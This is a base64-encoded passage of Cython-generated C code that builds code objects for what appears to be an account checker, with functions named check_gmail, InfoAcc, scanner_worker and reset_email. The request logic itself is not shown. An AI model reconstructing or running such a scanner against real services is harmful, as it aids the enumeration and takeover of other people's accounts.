RnJvbVN0cmluZygiNTY5OTc4NTIxNyIsIDAsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzU2OTk3ODUyMTcpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfODUwNzk0MDYzNCA9IFB5TG9uZ19Gcm9tU3RyaW5nKCI4NTA3OTQwNjM0IiwgMCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfODUwNzk0MDYzNCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMTI1NDAyOTgzNCA9IFB5TG9uZ19Gcm9tU3RyaW5nKCIyMTI1NDAyOTgzNCIsIDAsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIxMjU0MDI5ODM0KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIHJldHVybiAwOwogIF9fcHl4X0wxX2Vycm9yOjsKICByZXR1cm4gLTE7Cn0KCnR5cGVkZWYgc3RydWN0IHsKICAgIHVuc2lnbmVkIGludCBhcmdjb3VudCA6IDI7CiAgICB1bnNpZ25lZCBpbnQgbnVtX3Bvc29ubHlfYXJncyA6IDE7CiAgICB1bnNpZ25lZCBpbnQgbnVtX2t3b25seV9hcmdzIDogMTsKICAgIHVuc2lnbmVkIGludCBubG9jYWxzIDogNTsKICAgIHVuc2lnbmVkIGludCBmbGFncyA6IDEwOwogICAgdW5zaWduZWQgaW50IGZpcnN0X2xpbmUgOiA5OwogICAgdW5zaWduZWQgaW50IGxpbmVfdGFibGVfbGVuZ3RoIDogMTQ7Cn0gX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbjsKCnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlDb2RlX05ldygKICAgICAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyLAogICAgICAgIFB5T2JqZWN0ICogY29uc3QgKnZhcm5hbWVzLAogICAgICAgIFB5T2JqZWN0ICpmaWxlbmFtZSwKICAgICAgICBQeU9iamVjdCAqZnVuY25hbWUsCiAgICAgICAgY29uc3QgY2hhciAqbGluZV90YWJsZSwKICAgICAgICBQeU9iamVjdCAqdHVwbGVfZGVkdXBfbWFwCik7CgoKc3RhdGljIGludCBfX1B5eF9DcmVhdGVDb2RlT2JqZWN0cyhfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHsKICBQeU9iamVjdCogdHVwbGVfZGVkdXBfbWFwID0gUHlEaWN0X05ldygpOwogIGlmICh1bmxpa2VseSghdHVwbGVfZGVkdXBfbWFwKSkgcmV0dXJuIC0xOwogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MCwgMCwgMCwgMSwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMU3xDT19HRU5FUkFUT1IpLCA5MSwgMn07CiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9pfTsKICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzBdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX3RmX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9nZW5leHByLCBfX3B5eF9rXzFfMiwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlswXSkpIGdvdG8gYmFkOwogIH0KICB7CiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezAsIDAsIDAsIDEsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFN8Q09fR0VORVJBVE9SKSwgOTIsIDJ9OwogICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaX07CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxXSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV90Zl9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfa18xXzIsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMV0pKSBnb3RvIGJhZDsKICB9CiAgewogICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHswLCAwLCAwLCAxLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTfENPX0dFTkVSQVRPUiksIDkzLCAyfTsKICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X2l9OwogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMl0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fdGZfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X2tfUSwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsyXSkpIGdvdG8gYmFkOwogIH0KICB7CiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezAsIDAsIDAsIDEsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFN8Q09fR0VORVJBVE9SKSwgNDQ1LCAyfTsKICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X2Z1dHVyZX07CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlszXSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV90Zl9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfa19fMTcsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbM10pKSBnb3RvIGJhZDsKICB9CiAgewogICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHsxLCAwLCAwLCAxLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgNTYsIDkzfTsKICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X3NlbGZ9OwogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbNF0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fdGZfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2luaXQsIF9fcHl4X2tfQV9JUV9LcV9NX0ZfQV9RX0FfYV9hX2FfSElVX0txLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzRdKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MiwgMCwgMCwgMiwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDc0LCAxOH07CiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9zZWxmLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9rZXl9OwogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbNV0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fdGZfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2luY3JlbWVudF9jb3VudGVyLCBfX3B5eF9rX0EsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbNV0pKSBnb3RvIGJhZDsKICB9CiAgewogICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHsyLCAwLCAwLCAyLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgNzgsIDE5fTsKICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X3NlbGYsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2NvdW50fTsKICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzZdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX3RmX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9zZXRfYWN0aXZlX3RocmVhZHMsIF9fcHl4X2tfQV9RLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzZdKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MiwgMCwgMCwgMiwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDgyLCAxOH07CiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9zZWxmLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9rZXl9OwogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbN10gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fdGZfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dldF9jb3VudGVyLCBfX3B5eF9rX0FfNHhxLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzddKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MSwgMCwgMCwgMSwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDg2LCA3fTsKICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X3NlbGZ9OwogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbOF0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fdGZfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2NyZWF0ZV9iYW5uZXIsIF9fcHl4X2tfQV9RXzIsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbOF0pKSBnb3RvIGJhZDsKICB9CiAgewogICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHsxLCAwLCAwLCAyMCwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDg5LCA0NDh9OwogICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc2VsZiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfbjEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X24yLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9ob3N0LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9oZTMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3JlczEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X21hdGNoLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV90b2ssIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2Nvb2tpZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2hlYWRlcnMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2RhdGEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3Jlc3BvbnNlLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV90bF9tYXRjaCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdGwsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2YsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2UsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmV4cHJ9OwogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbOV0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fdGZfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3RsbCwgX19weXhfa19BXzVfMV81XzFfMlVfUV9XXzdxX1ZWbm5zX3RfQl9CLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzldKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MiwgMCwgMCwgMTcsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCAxMjYsIDQ0NX07CiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9zZWxmLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9lbWFpbCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfb3JpZ2luYWxfZW1haWwsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2YsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X28sIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3RsLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9ob3N0LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9jb29raWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9wYXJhbXMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2RhdGEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3Jlc3BvbnNlLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91c2VybmFtZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZm9sbG93ZXJfY291bnQsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X29rLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9nZywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZX07CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxMF0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fdGZfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2NoZWNrX2dtYWlsLCBfX3B5eF9rX0FfUV90M2FfMUZfUWFfSEFfYl8yUWFfSEFfYl8yUWEsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTBdKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MiwgMCwgMCwgMTIsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCAxODEsIDMyOX07CiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9zZWxmLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9lbWFpbCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdWEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2RldiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZGV2aWNlX2lkLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91dWksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2hlYWRlcnMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2RhdGEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3Jlc3BvbnNlLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91c2VybmFtZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZm9sbG93ZXJfY291bnQsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2V9OwogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTFdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX3RmX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9jaGVjaywgX19weXhfa19BX0FfQV90MUNxX0ZfV0N6XzJRX1FkX2FfY2NkX0ZfQSwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxMV0pKSBnb3RvIGJhZDsKICB9CiAgewogICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHsyLCAwLCAwLCA3LCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgMjI5LCAyMTh9OwogICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc2VsZiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdXNlciwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaGVhZGVycywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZGF0YSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcmVzcG9uc2UsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3IsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2V9OwogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTJdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX3RmX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yZXN0LCBfX3B5eF9rX0FfcV9RX3FfcV9hX1FfcV9hXzFfMV9BX2FfY2NkX0YsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTJdKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MiwgMCwgMCwgMywgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDI3MCwgMTY5fTsKICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X3NlbGYsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X0lkLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91aWR9OwogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTNdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX3RmX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9kYXRlLCBfX3B5eF9rX0FfUWFfcl82X3FfRl9xX1YxX3FfM2ZBX3FfM2ZBX3EsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTNdKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MywgMCwgMCwgMTksICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCAyOTgsIDUwMX07CiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9zZWxmLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91c2VybmFtZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2csIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3JyLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9JZCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZnVsbF9uYW1lLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9mb3dzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9mb3dnLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9wcCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaXNQcmFpc2UsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2JpbywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaXNfdmVyaWZpZWQsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X21ldGEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3Jlc2V0X2VtYWlsLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9lbWFpbCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc3MsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2lubGluZV9rZXlib2FyZCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcGF5bG9hZCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZX07CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxNF0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fdGZfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X0luZm9BY2MsIF9fcHl4X2tfQV9hcV9adDFKYV80cV9hX2FfQV8yVF9BXzJUX1FfNHEsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTRdKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MSwgMCwgMCwgMywgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDM2OSwgMjh9OwogICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc2VsZiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc3RhcnQsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2VuZH07CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxNV0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fdGZfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmVyYXRlX3VzZXJfaWQsIF9fcHl4X2tfQV93bF9zXzZfMUcxLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzE1XSkpIGdvdG8gYmFkOwogIH0KICB7CiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezIsIDAsIDAsIDIwLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgMzczLCA1MDB9OwogICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc2VsZiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfd29ya2VyX2lkLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91c2VyX2lkLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9tb2RlbF9udW1iZXIsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2FuZHJvaWRfdmVyc2lvbiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZHBpXzIsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3Jlc29sdXRpb24sIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2JyYW5kLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9idWlsZF9zdWZmaXgsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3VzZXJfYWdlbnRfMiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfbHNkX3Rva2VuLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yZXNwb25zZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdXNlcl9pbmZvLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91c2VybmFtZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZm9sbG93ZXJfY291bnQsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X21lZGlhX2NvdW50LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9lbWFpbCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZX07CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxNl0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fdGZfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3NjYW5uZXJfd29ya2VyLCBfX3B5eF9rX0FfYX